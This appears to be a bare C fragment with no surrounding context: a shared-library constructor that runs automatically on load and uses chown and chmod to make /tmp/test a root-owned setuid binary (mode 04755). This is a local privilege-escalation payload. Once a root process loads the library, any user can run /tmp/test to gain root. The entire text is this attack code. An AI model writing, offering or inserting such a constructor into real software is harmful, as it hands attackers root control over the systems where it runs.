void __attribute__((constructor)) init (void)
{
chown("/tmp/test", 0, 0);
chmod("/tmp/test", 04755);
}
